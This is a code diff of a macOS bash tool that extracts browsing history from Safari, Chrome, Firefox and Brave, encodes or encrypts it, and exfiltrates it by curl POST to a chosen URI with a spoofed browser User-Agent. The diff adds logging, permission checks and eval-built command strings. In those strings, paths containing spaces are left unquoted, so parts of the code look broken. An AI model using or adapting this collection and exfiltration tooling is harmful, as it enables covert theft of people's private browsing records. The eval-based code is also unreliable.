@@ -49,13 +49,46 @@ display_help() {
     echo "  --encrypt=METHOD          Encrypt output (aes|blowfish|gpg). Generate key"
 }
 
-# Function: Log messages
+# Verbose function
+verbose() {
+    if [ "$VERBOSE" = true ]; then
+        echo "$@"
+    fi
+    if [ "$LOG_ENABLED" = true ]; then
+        echo "$@" >> "$LOG_FILE"
+    fi
+}
+
+
+# Get current user
+get_user() {
+    USER=$(whoami)
+}
+
+# Function to get the current timestamp
+get_timestamp() {
+    date +"%Y-%m-%d %H:%M:%S"
+}
+
+# Updated log function
 log() {
     local message="$1"
+    local command="$2"
+    local timestamp=$(get_timestamp)
+    get_user
+    local log_message="[${timestamp}]: user: ${USER}; msg: ${message}"
+    if [ -n "$command" ]; then
+        log_message+="; command: \"${command}\""
+    fi
     if [ "$LOG_ENABLED" = true ]; then
-        echo "$(date +"%Y-%m-%d %H:%M:%S") - $message" >> "$LOG_FILE"
-    else
-        echo "$message"
+        echo -e "$log_message" >> "$LOG_FILE"
+        if [ -n "$3" ]; then
+            echo -e "Raw output:\n$3" >> "$LOG_FILE"
+        fi
+    fi
+    verbose "$log_message"
+    if [ -n "$3" ] && [ "$VERBOSE" = true ]; then
+        echo -e "Raw output:\n$3"
     fi
 }
 
@@ -89,27 +122,21 @@ exfiltrate_http() {
     local data="$1"
     local uri="$2"
     if [ -z "$data" ]; then
-        echo "No data to exfiltrate" >&2
+        log "No data to exfiltrate" "" ""
         return 1
     fi
     
     # Always base64 encode the data before exfiltration
     local encoded_data=$(ENCODE=base64 encode_output "$data")
     
-    # Use POST method for all data
+    local command="curl -X POST \"$uri\" -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\" -d \"d=$encoded_data\""
+    
     if [ "$VERBOSE" = true ]; then
-        echo "Exfiltrating data to $uri using POST"
-        curl -X POST "$uri" \
-             -H "Content-Type: application/x-www-form-urlencoded" \
-             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
-             -d "d=$encoded_data" \
-             -v
+        log "Exfiltrating data to $uri using POST" "$command" ""
+        eval "$command -v"
     else
-        curl -X POST "$uri" \
-             -H "Content-Type: application/x-www-form-urlencoded" \
-             -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
-             -d "d=$encoded_data" \
-             -s
+        log "Exfiltrating data to $uri using POST" "$command" ""
+        eval "$command -s > /dev/null 2>&1"
     fi
 }
 
@@ -156,22 +183,44 @@ encrypt_data() {
     esac
 }
 
+# Function to check file permissions
+check_permissions() {
+    local file="$1"
+    local permission="$2"
+    if [ -f "$file" ]; then
+        if [ -r "$file" ] && [ "$permission" = "r" ]; then
+            return 0
+        elif [ -w "$file" ] && [ "$permission" = "w" ]; then
+            return 0
+        elif [ -x "$file" ] && [ "$permission" = "x" ]; then
+            return 0
+        else
+            log "Warning: Insufficient permissions for $file" "" ""
+            return 1
+        fi
+    else
+        log "Warning: File $file not found" "" ""
+        return 1
+    fi
+}
+
 # Function to extract Safari history
 safari_history() {
     local safari_db="$HOME/Library/Safari/History.db"
     local output
 
-    if [[ -f "$safari_db" ]]; then
-        output=$(sqlite3 "$safari_db" "SELECT url, visit_time FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id;" 2>&1)
+    if check_permissions "$safari_db" "r"; then
+        local command="sqlite3 $safari_db \"SELECT url, visit_time FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id;\""
+        output=$(eval "$command" 2>&1)
         if [ $? -eq 0 ]; then
-            log "Successfully extracted Safari browser history"
+            log "Successfully extracted Safari browser history" "$command" "$output"
             echo "$output"
         else
-            log "Error: Unable to extract Safari history. Authorization might be denied."
+            log "Error: Unable to extract Safari history. Details: $output" "$command" ""
             echo ""
         fi
     else
-        log "Error: Safari history database not found."
+        # The check_permissions function will log the warning, so we don't need to log here
         echo ""
     fi
 }
@@ -179,40 +228,51 @@ safari_history() {
 # Function to extract Chrome history
 chrome_history() {
     local chrome_db="$HOME/Library/Application Support/Google/Chrome/Default/History"
-    local output
+    local output=""
 
-    if [[ -f "$chrome_db" ]]; then
-        output=$(sqlite3 "$chrome_db" "SELECT last_visit_time, url FROM urls;" 2>&1)
+    if check_permissions "$chrome_db" "r"; then
+        local command="sqlite3 $chrome_db \"SELECT last_visit_time, url FROM urls;\""
+        output=$(eval "$command" 2>&1)
         if [ $? -eq 0 ]; then
-            log "Successfully extracted Chrome browser history"
+            log "Successfully extracted Chrome browser history" "$command" "$output"
             echo "$output"
         else
-            log "Error: Unable to extract Chrome history. Authorization might be denied."
+            log "Error: Unable to extract Chrome history. Details: $output" "$command" ""
             echo ""
         fi
     else
-        log "Error: Chrome history database not found."
+        # The check_permissions function will log the warning, so we don't need to log here
         echo ""
     fi
 }
 
+
+
+
+
+
 # Function to extract Firefox history
 firefox_history() {
-    local firefox_db=$(find ~/Library/Application\\ Support/Firefox/Profiles -name "places.sqlite")
-    local output
+    local firefox_profile=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
+    local firefox_db="${firefox_profile}/places.sqlite"
+    local output=""
 
-    if [[ -f "$firefox_db" ]]; then
-        output=$(sqlite3 "$firefox_db" "SELECT url, last_visit_date FROM moz_places;" 2>&1)
+    if check_permissions "$firefox_db" "r"; then
+        local temp_db="/tmp/firefox_history_temp.sqlite"
+        cp "$firefox_db" "$temp_db"
+        
+        local command="sqlite3 $temp_db \"SELECT url, datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as last_visit FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 1000;\""
+        output=$(eval "$command" 2>&1)
+        
         if [ $? -eq 0 ]; then
-            log "Successfully extracted Firefox browser history"
+            log "Successfully extracted Firefox browser history" "$command" "$output"
             echo "$output"
+            rm "$temp_db"
         else
-            log "Error: Unable to extract Firefox history. Authorization might be denied."
-            echo ""
+            log "Error: Unable to extract Firefox history. Details: $output" "$command" ""
         fi
     else
-        log "Error: Firefox history database not found."
-        echo ""
+        verbose "Insufficient permissions to read Firefox history database"
     fi
 }
 
@@ -221,23 +281,26 @@ brave_history() {
     local brave_db="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
     local output
 
-    if [[ -f "$brave_db" ]]; then
-        output=$(sqlite3 "$brave_db" "SELECT last_visit_time, url FROM urls;" 2>&1)
+    if check_permissions "$brave_db" "r"; then
+        local command="sqlite3 $brave_db \"SELECT last_visit_time, url FROM urls;\""
+        output=$(eval "$command" 2>&1)
         if [ $? -eq 0 ]; then
-            log "Successfully extracted Brave browser history"
+            log "Successfully extracted Brave browser history" "$command" "$output"
             echo "$output"
         else
-            log "Error: Unable to extract Brave history. Authorization might be denied."
+            log "Error: Unable to extract Brave history. Details: $output" "$command" ""
             echo ""
         fi
     else
-        log "Error: Brave history database not found."
+        # The check_permissions function will log the warning, so we don't need to log here
         echo ""
     fi
 }
 
 # Main function
 main() {
+    verbose "Starting browser history extraction"
+    
     local output=""
 
     if [ "$ALL" = true ] || [ "$SAFARI" = true ]; then
@@ -256,9 +319,11 @@ main() {
         output+="$(brave_history)\n"
     fi
 
+    output=$(echo -e "$output" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')
+
     if [ -n "$output" ]; then
         if [ "$ENCODE" != "none" ]; then
-            # Apply the specified encoding
+            verbose "Encoding output using $ENCODE method"
             output=$(encode_output "$output")
         fi
 
@@ -271,7 +336,11 @@ main() {
         else
             echo -e "$output"
         fi
+    else
+        verbose "No valid browser history extracted"
     fi
+
+    verbose "Browser history extraction completed"
 }
 
 # Argument parsing
@@ -300,14 +369,10 @@ while [ "$#" -gt 0 ]; do
         --encrypt=*)
             ENCRYPT="${1#*=}"
             ENCRYPT_KEY=$(openssl rand -base64 32)
-            if [ "$VERBOSE" = true ]; then
-                echo "Generated encryption key: $ENCRYPT_KEY"
-            fi
+            verbose "Generated encryption key: $ENCRYPT_KEY"
             ;;
         *) echo "Invalid option: $1" >&2; display_help; exit 1 ;;
     esac
     shift
 done
-
-# Start the main function
 main
